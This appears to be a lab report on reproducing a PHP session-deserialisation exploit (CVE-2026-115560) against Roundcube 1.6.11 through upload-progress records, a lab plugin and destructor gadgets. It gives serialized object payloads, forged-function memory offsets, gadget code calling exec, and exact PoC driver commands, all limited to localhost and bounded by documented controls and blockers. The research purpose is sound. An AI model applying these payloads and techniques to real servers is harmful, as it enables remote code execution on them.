# Roundcube 1.6.11 + CVE-2026-115560 — precondition, plugin load order, terminal

**LAB-ONLY.** Targets `127.0.0.1` only. Fixed benign command
`id>/tmp/vd 2>&1`; there is no arbitrary-command interface. Published
2026-10-31; see `docs/RESPONSIBLE_PUBLICATION.md`.

Status: 2026-10-31. Phase 2 of the internal 115560 plan.

## Gate G2 verdict

**PASS for the plugin-assisted Roundcube profile** — plugin load order, the
upload-progress session write path, and the terminal `uid=33` proof all
reproduce on 8.4.27 and 8.5.12 through the real `php` session decode.
**Stock `session_storage='db'` is a documented blocker** (the upload-progress
record is written to the file store but the app reads the DB).

The caveat is structural, not a lab artifact: stock Roundcube 1.6.11 has no
configuration in which the driver-level `ini_set(...,'php')` (which runs
unconditionally for db/redis/memcache) and the native file read both happen.
That line lives in `rcube_session::register_session_handler()`, which only the
db/redis/memcache/memcached drivers call. The lab plugin
therefore performs the runtime switch itself (the same line, at the same point
in the request: after plugin load, before `session_init()`), while
`session_storage='php'` makes the app read the same file the upload-progress
hook writes.

## Files created

```
lab-roundcube/
  setup.sh                                 downloads Roundcube 1.6.11 into html/ (not tracked)
  docker-compose.yml                       :18310 8.4.27 | :18311 8.5.12
  php-roundcube.ini                        php_serialize, upload_progress On, cleanup Off, /tmp/sessions
  php-roundcube-8512.ini                   PHP 8.5 only: disable_functions=array_first (compat)
  apache-single.conf                       one prefork child, MaxConnectionsPerChild=1
  config.inc.php                           session_storage='php' + plugin vd115560
  plugin/vd115560/vd115560.php             runtime handler switch + gadget classes
  prime.php                                upload-progress writer without session_start()
  scan_prefix.php                          lab scanner (raw session-buffer candidate finder)
  evidence/8427.log, 8512.log, prime-8427.log
  html/                                    downloaded app tree (git-ignored)
poc/verify_115560_roundcube.py             measure/fire/simple/prime/run driver
docs/ROUNDCUBE_115560.md                   this file
```

Shared files (`poc/verify_115560_vardestroy.py`, `poc/verify_115560_race.py`,
`lab-115560/*`) were not modified. The new driver imports the shared payload
builder (`verify_vardestroy_postcarrier.py`) and `force_fail()` from the
existing driver without editing either.

## Source facts that decide the design

- `program/include/rcmail.php:111` loads plugins, `:116` calls
  `session_init()`. Plugin files are `include`d at load time, so their
  top-level code runs **before** `session_start()`.
- `program/lib/Roundcube/rcube_session.php:109-116` —
  `ini_set('session.serialize_handler', 'php')` inside
  `register_session_handler()`.
- That method is called only by
  `program/lib/Roundcube/session/{db,redis,memcache,memcached}.php`.
  `session/php.php` (the native handler) **does not** call it.
- There is no `session_storage='files'` driver in 1.6.11. The native-file
  option is `'php'` (documented in `config/defaults.inc.php:628`).
- `rcmail::session_init()` (`program/lib/Roundcube/rcube.php:446-496`) renames
  the session to `roundcube_sessid` and `session.use_only_cookies=1` before
  `session_start()`. The upload-progress hook ran earlier under the server
  session name (`PHPSESSID`), so the exploit request sends **both** cookie
  names with the same SID.

## Why the stock DB/Redis path is blocked

PHP's rfc1867 upload-progress hook initialises the session during request
startup, before any application code runs. It uses the **server**
`session.save_handler` (`files` + `session.save_path=/tmp/sessions`), so the
progress record lands in `sess_<sid>`. Roundcube then installs its own save
handler in `session_init()`:

- `session_storage='db'` → `rcube_session_db` reads the `session` table. The
  file record is never read, so the bytes after `|` never reach
  `php_var_unserialize()`.
- `session_storage='php'` → the app reads the file, but
  `rcube_session_php` does not perform the handler switch, so the configured
  `php_serialize` decoder would read the progress record as ordinary data.
- `redis`/`memcache(d)` → same as DB (custom store). A server
  `session.save_handler=redis` pointed at the same instance as Roundcube's
  redis driver could in principle line up the keyspace, but this was **not**
  tested and is not claimed.

Verified on 8.4.27 with `session_storage='db'` (SQLite):
`poc/verify_115560_roundcube.py ... simple` produced no dtor and no
`/tmp/vd`; the DB row held only
`temp|b:1;language|s:5:"en_US";task|s:5:"login";skin_config|a...` with no
`upload_progress` bytes. That is the blocker, reproduced, not assumed.

## Harness

Server: `session.serialize_handler=php_serialize`,
`session.upload_progress.enabled=On`, `cleanup=Off`,
`session.save_handler=files`, `session.save_path=/tmp/sessions`.
Roundcube: `session_storage='php'`, `session_name='roundcube_sessid'`, SQLite
DSN only to satisfy `INIT_WITH_DB` (the SQLite driver self-initialises its
schema). Plugin `vd115560` is listed in `$config['plugins']`.

The plugin's top-level code logs a marker, performs
`ini_set('session.serialize_handler','php')` (gated by
`/tmp/rc-vd-noswitch` for the control), and defines:

- `VdSimple::__destruct()` → `exec('id>/tmp/vd 2>&1')` (simple gadget);
- `CachePurge` — the proven `lab-115560` dtor: same-size spray + `@unserialize('R:1020;')`
  (terminal).

`nogadget` control: `/tmp/rc-vd-nogadget` suppresses the class definitions.

## Load-order proof (empirical)

One simple-gadget request on 8.4.27 (`/tmp/rc-vd.log`):

```
1793404264.188396 pid=29 plugin-load handler=php_serialize name=PHPSESSID
1793404264.188448 pid=29 handler-switched handler=php
1793404264.188881 pid=29 simple-dtor          <- during session_start decode
1793404264.191581 pid=29 plugin-init task=.*  <- after session_init
proof: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The destructor runs **before** `plugin-init`, i.e. the class was available at
decode time because the plugin file was included before `session_init()`.

## Session write path proof

`prime` mode sends a valid `a:1018:{...}` payload to `/prime.php` (no
`session_start`), then dumps the file:

```
[p] sess_rcprime8427abc:
b'a:1:{s:10294:"upload_progress_|a:1018:{i:0;s:4096:"\x00...'
```

That is the `php_serialize` writer storing
`upload_progress_` + the attacker value as the session key. The `php` decoder
splits at the first `|`, so everything after it is fed to
`php_var_unserialize()` during the app's `session_start()`.

## Simple-gadget results

Payload: progress value = `|O:8:"VdSimple":0:{}` (value object; no prime
needed). The decode instantiates the class and the dtor runs (decode then
fails on the trailing progress wrapper, which is expected and harmless).

| build | endpoint | proof |
|---|---|---|
| 8.4.27 | `127.0.0.1:18310` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 8.5.12 | `127.0.0.1:18311` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |

## Terminal results (plugin dtor → `@unserialize('R:1020;')` → forged `zif_system`)

The driver primes the SID (one dummy record), then POSTs the proven
`a:1018:{...}` `CachePurge` payload with the forged carrier key. `?m=4` skips
the dry mid-parse dtor and fires on the real decode-failure `var_destroy` dtor.

| build | main | lib | zif_system | delta | spray | proof |
|---|---|---|---|---|---|---|
| 8.4.27 | `0xffffab600000` | `0xffffad780000` | `0xffffadbb1510` | `0x8d9c1` | `3048` | `uid=33` |
| 8.5.12 | `0xffff81c00000` | `0xffff7e600000` | `0xffff7eb35490` | `0x9e9c1` | `8135` | `uid=33` |

Repeat runs were stable (8.4.27 2/2, 8.5.12 2/2 before the final capture;
the captured runs after restart also hit). `response=<none>` on the terminal
is expected: the forged call corrupts the request; `/tmp/vd` is the proof.

### Roundcube-specific carrier note (important)

The lab-115560 driver takes the first magic hit whose preceding bytes are
`a:1018:{i:0;s:4096:"`. Under Roundcube that is **not** the live carrier: the
request-body buffer sits at the old lab delta (`0x6c019`), and the session
file read happens twice more. The new driver instead selects hits whose 17
bytes before the payload are `upload_progress_|` (session-file copies) and
takes the **highest-address** candidate. On 8.4.27 the candidates were
`0x799c1`, `0x80029`, `0x8d9c1`; the lowest is released before the real dtor
(fire at `0x799c1` produces no proof), the higher two fire. On 8.5.12 the
candidates were `0x799c1`, `0x80029`, `0x859c1`, `0x9e9c1`; the highest
fired.

Measure and fire must use **different SIDs**: the measured delta describes a
two-record file (prime dummy + one payload). Reusing the measure SID adds a
third progress key and moves the carrier; this was observed (HTTP 200, no
proof) and fixed in the driver.

## Controls (all negative, no `/tmp/vd`)

Ran on both builds at the captured addresses:

| control | 8.4.27 | 8.5.12 |
|---|---|---|
| `--bias-zif 0x1000` | `response=<none>`, no proof | `response=<none>`, no proof |
| `--noswitch` (plugin skips `ini_set`) | HTTP 200, no proof | HTTP 200, no proof |
| `--nogadget` (classes not defined) | HTTP 200, no proof | HTTP 200, no proof |

Simple-gadget controls behaved identically (no `simple-dtor` in the log).

## Exact commands

```bash
cd lab-roundcube && ./setup.sh && docker compose up -d && cd ..

# simple gadget (both builds)
python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18310 --container php2shell-rc-8427 --build 8.4.27 simple
python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18311 --container php2shell-rc-8512 --build 8.5.12 simple

# terminal: measure + fire
python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18310 --container php2shell-rc-8427 --build 8.4.27 run
python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18311 --container php2shell-rc-8512 --build 8.5.12 run

# controls (use the addresses printed by the run)
python3 poc/verify_115560_roundcube.py --target 127.0.0.1:18310 \
  --container php2shell-rc-8427 --build 8.4.27 \
  --main 0xffffab600000 --delta 0x8d9c1 --zif 0xffffadbb1510 --bias-zif 0x1000 fire
python3 poc/verify_115560_roundcube.py --target 127.0.0.1:18310 \
  --container php2shell-rc-8427 --build 8.4.27 \
  --main 0xffffab600000 --delta 0x8d9c1 --zif 0xffffadbb1510 --noswitch fire

# session-write evidence
python3 poc/verify_115560_roundcube.py --target 127.0.0.1:18310 \
  --container php2shell-rc-8427 --build 8.4.27 --sid rcprime8427abc prime
```

## Blockers / limits

- **Not a stock Roundcube chain.** The plugin supplies the runtime handler
  switch. The stock app-side switch (db/redis/memcache) and the stock
  file-read path (`session_storage='php'`) are mutually exclusive in 1.6.11.
  A real-world Roundcube target would need either a plugin that performs the
  switch (or that uses native sessions and has another switch site) plus a
  re-entry destructor, or a Redis layout where the server save handler and
  Roundcube's redis driver meet (untested).
- **DB save handler is a hard blocker for this delivery shape**, because the
  upload-progress write happens before `session_set_save_handler()` can be
  called by the app. Confirmed with SQLite.
- **`cleanup=Off` direct profile.** The `cleanup=On` race was proven on the
  lab-115560 harness (`docs/RACE_WAKEUP_115560.md`), not re-run here.
- **Single prefork child** for address determinism, same as the lab; worker
  pinning is covered by `docs/WORKERS_115560.md`.
- **PHP 8.5 compat shim.** Roundcube 1.6.11 unconditionally declares
  `array_first()`, which is a PHP 8.5 builtin; the 8.5.12 service disables the
  builtin so Roundcube's polyfill loads. This is a Roundcube/PHP-version
  incompatibility, unrelated to 115560, and it does not affect `zif_system`.
- The gadget class is a lab plugin. The terminal proof establishes the
  composition through a real Roundcube `session_start()`, not the existence of
  a stock Roundcube gadget (the survey found none).

## Evidence files

- `lab-roundcube/evidence/8427.log` — simple, terminal, three controls.
- `lab-roundcube/evidence/8512.log` — simple, terminal, three controls.
- `lab-roundcube/evidence/prime-8427.log` — on-disk `php_serialize` record.
